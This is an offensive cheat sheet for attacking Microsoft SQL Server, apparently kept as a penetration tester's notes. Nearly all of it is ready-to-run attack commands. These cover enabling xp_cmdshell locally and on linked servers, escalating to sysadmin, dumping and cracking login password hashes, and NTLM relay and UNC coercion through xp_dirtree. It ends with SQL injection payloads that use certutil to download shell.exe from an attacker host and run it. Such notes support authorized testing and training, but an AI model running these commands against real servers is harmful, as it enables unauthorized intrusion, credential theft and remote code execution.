# MSSQL

## Overview

Enumeration, login handling, linked-server abuse, impersonation, UNC coercion, and operating-system command execution through SQL Server.

## Default Ports

- 1433/tcp default, 1434/udp SQL Browser

## SNMP / MSSQL

```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```

## Service Enumeration / MSSQL

```bash
nmap --script=ms-sql-info -p 1433 <target>
sqsh -S <target> -U sa

dbeaver
```

## PowerUpSQL

https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

## PowerUpSQL SQLServerLinkCrawl

```
Get-SQLServerLinkCrawl -Instance <sqlserver> | format-table
```

## PowerUpSQL Check current user

```
Get-SQLQuery -Instance <sqlserver> -Query "SELECT SYSTEM_USER;"
```

## PowerUpSQL Check is sysadmin

```
Get-SQLQuery -Instance <sqlserver> -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
```

## PowerUpSQL Enable xp_cmdshell

```
Get-SQLQuery -Instance <sqlserver> -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

## PowerUpSQL Execute xp_cmdshell

```
Invoke-SQLOSCmd -Verbose -Instance <sqlserver> -Command "<cmd>"
```

## PowerUpSQL Escalate to sysadmin

```
Invoke-SQLEscalatePriv -Verbose -Instance <sqlserver>
```

## findstr db password in web.config

```
findstr /s /i ConnectionString <PATH>*.config && echo finish
```

## xp_dirtree

https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet
```
exec xp_dirtree '\\<listen_ip>\file'
```

## Check link server AT other server

```
EXEC ('sp_linkedservers') AT [<link_sqlserver>]
```

## Check sysadmin on link server

```
select mylogin from openquery("<link_sqlserver>", 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as mylogin');
```

## Enable xp_cmdshell on link server

```
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<link_sqlserver>]
```

## Exec xp_cmdshell on link server

```
EXEC ('EXEC xp_cmdshell ''<cmd>'' ') AT [<link_sqlserver>]
```

## Enable xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## List password hash on database

```
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

## show databases

```
SELECT name, database_id, create_date FROM sys.databases;
```

## show tables (master)

```
SELECT name FROM master..sysobjects WHERE xtype = 'U';
```

## show tables

```
SELECT name FROM <database>..sysobjects WHERE xtype = 'U';
```

## enum_impersonate list all login with impersonation permission

Login are created at the SQL Server instance level. SQL Login is for Authentication.
```
SELECT 'LOGIN' as 'execute as','' AS 'database',
pe.permission_name, pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor'
FROM sys.server_permissions pe
JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id
JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

## enum_impersonate list all users with impersonation permission

User is created at SQL Server database level. SQL Server User is for Authorization.
```
use <db>;
SELECT 'USER' as 'execute as', DB_NAME() AS 'database',
pe.permission_name,pe.state_desc, pr.name AS 'grantee', pr2.name AS 'grantor'
FROM sys.database_permissions pe
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id
JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = 'IM'
```

## enum_links

```
EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin
```

## Hashcat MSSQL (2012, 2014) 0x02....

```
hashcat -m 1731 --force -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

## ntlmrelayx MSSQL

```
impacket-ntlmrelayx --no-http-server -smb2support -t mssql://<target> -q "SELECT SYSTEM_USER"
```

## Service Enumeration / MSSQL

```bash
nmap --script=ms-sql-info -p 1433 <target>
sqsh -S <target> -U sa
```

---

## Connection

```
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

---

## Common Commands

```
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```
```
1> SELECT name FROM master.sys.databases
2> go
```

---

## OPENQUERY

```
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```
```
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```
```
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```
```
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

## xp\_cmdshell

```
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```
```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```
```
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

## See Also

- `02 Web/SQL Injection.md`
- `07 Creds and Cracking/Password Spraying and Reuse.md`
